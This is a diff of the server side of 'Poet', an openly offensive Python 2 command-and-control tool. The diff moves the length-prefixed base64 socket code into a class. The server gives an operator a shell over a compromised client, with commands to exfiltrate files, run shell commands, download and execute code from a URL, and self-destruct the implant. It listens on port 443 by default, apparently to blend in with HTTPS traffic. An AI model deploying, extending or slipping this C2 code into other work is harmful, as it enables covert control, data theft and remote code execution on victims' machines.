@@ -23,6 +23,70 @@ Content-Type: text/plain\r
 body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""
 
 
+class PoetSocket():
+    """Socket wrapper for data transfer."""
+
+    def __init__(self, socket):
+        self.s = socket
+
+    def exchange(self, msg):
+        self.send(msg)
+        return self.recv()
+
+    def send(self, msg):
+        """
+            Sends message using socket operating under the convention that the
+            message is prefixed by a big-endian 32 bit value indicating the
+            length of the following base64 string.
+        """
+
+        pkg = base64.b64encode(msg)
+        pkg_size = struct.pack('>i', len(pkg))
+        sent = self.s.sendall(pkg_size + pkg)
+        if sent:
+            raise socket.error('socket connection broken')
+
+    def recv(self):
+        """
+            Receives message from socket operating under the convention that
+            the message is prefixed by a big-endian 32 bit value indicating the
+            length of the following base64 string.
+
+            Returns the message.
+
+            TODO: Under high network loads, it's possible that the initial recv
+            may not even return the first 9 bytes so another loop is necessary
+            to ascertain that.
+        """
+
+        chunks = []
+        bytes_recvd = 0
+        initial = self.s.recv(SIZE)
+        if not initial:
+            raise socket.error('socket connection broken')
+        msglen, initial = (struct.unpack('>I', initial[:4])[0], initial[4:])
+        bytes_recvd = len(initial)
+        chunks.append(initial)
+        while bytes_recvd < msglen:
+            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
+            if not chunk:
+                raise socket.error('socket connection broken')
+            chunks.append(chunk)
+            bytes_recvd += len(chunk)
+        return base64.b64decode(''.join(chunks))
+
+
+class PoetSocketServer(PoetSocket):
+    def __init__(self, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.s.bind(('', port))
+        self.s.listen(1)
+
+    def accept(self):
+        return self.s.accept()
+
+
 def get_args():
     """ Parse arguments and return dictionary. """
 
@@ -35,8 +99,8 @@ def shell_server(s, PORT):
     cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil', 'selfdestruct',
             'dlexec']
     print '[+] ({}) Entering control shell'.format(datetime.now())
-    conn, addr = s.accept()
-    prompt = shell_exchange(conn, 'getprompt')
+    conn = PoetSocket(s.accept()[0])
+    prompt = conn.exchange('getprompt')
     print 'Welcome to psh, the poet shell!'
     print 'Running `help\' will give you a list of supported commands.'
     while True:
@@ -81,7 +145,7 @@ def shell_server(s, PORT):
             elif base == cmds[5]:
                 if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
                     for file in inp.split()[1:]:
-                        resp = shell_exchange(conn, 'exfil ' + file)
+                        resp = conn.exchange('exfil ' + file)
                         if 'No such' in resp:
                             print 'psh : {}: {}'.format(resp, file)
                             continue
@@ -95,7 +159,7 @@ def shell_server(s, PORT):
                     print """[!] WARNING: You are about to permanently remove the client from the target.
     You will immediately lose access to the target. Continue? (y/n)""",
                     if raw_input().lower()[0] == 'y':
-                        resp = shell_exchange(conn, 'selfdestruct')
+                        resp = conn.exchange('selfdestruct')
                         if resp == 'boom':
                             print '[+] ({}) Exiting control shell.'.format(datetime.now())
                             return
@@ -108,7 +172,7 @@ def shell_server(s, PORT):
             # dlexec
             elif base == cmds[7]:
                 if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
-                    resp = shell_exchange(conn, inp)
+                    resp = conn.exchange(inp)
                     msg = 'successful' if resp == 'done' else 'error: ' + resp
                     print 'psh : dlexec {}'.format(msg)
                 else:
@@ -121,12 +185,12 @@ def shell_server(s, PORT):
         except EOFError:
             print
             break
-    socksend(conn, 'fin')
+    conn.send('fin')
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
 def shell_generic(s, req, write_flag=False, write_file=None):
-    resp = shell_exchange(s, req)
+    resp = s.exchange(req)
     print resp
     if write_flag:
         shell_write(resp, req.split()[0], OUT, write_file)
@@ -215,7 +279,7 @@ def shell_shell(s, prompt):
             elif inp == 'exit':
                 break
             else:
-                print shell_exchange(s, 'shell {}'.format(inp))
+                print s.exchange('shell {}'.format(inp))
         except KeyboardInterrupt:
             print
             continue
@@ -224,64 +288,10 @@ def shell_shell(s, prompt):
             break
 
 
-def shell_exchange(conn, req):
-    socksend(conn, req)
-    return sockrecv(conn)
-
-
-def socksend(s, msg):
-    """
-        Sends message using socket operating under the convention that the
-        message is prefixed by a big-endian 32 bit value indicating the length
-        of the following base64 string.
-    """
-
-    pkg = base64.b64encode(msg)
-    pkg_size = struct.pack('>i', len(pkg))
-    sent = s.sendall(pkg_size + pkg)
-    if sent:
-        raise socket.error('socket connection broken')
-
-
-def sockrecv(s):
-    """
-        Receives message from socket operating under the convention that the
-        message is prefixed by a big-endian 32 bit value indicating the length
-        of the following base64 string.
-
-        Returns the message.
-
-        TODO: Under high network loads, it's possible that the initial recv
-        may not even return the first 9 bytes so another loop is necessary
-        to ascertain that.
-    """
-
-    chunks = []
-    bytes_recvd = 0
-    initial = s.recv(SIZE)
-    if not initial:
-        raise socket.error('socket connection broken')
-    msglen, initial = (struct.unpack('>I', initial[:4])[0], initial[4:])
-    bytes_recvd = len(initial)
-    chunks.append(initial)
-    while bytes_recvd < msglen:
-        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
-        if not chunk:
-            raise socket.error('socket connection broken')
-        chunks.append(chunk)
-        bytes_recvd += len(chunk)
-    return base64.b64decode(''.join(chunks))
-
-
 def main():
     args = get_args()
     PORT = int(args.port) if args.port else 443
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(('', PORT))
-    s.listen(1)
-
+    s = PoetSocketServer(PORT)
     print '[+] Poet server started on {}.'.format(PORT)
     conn, addr = s.accept()
     print '[i] Connected By: {} at {}'.format(addr, datetime.now())
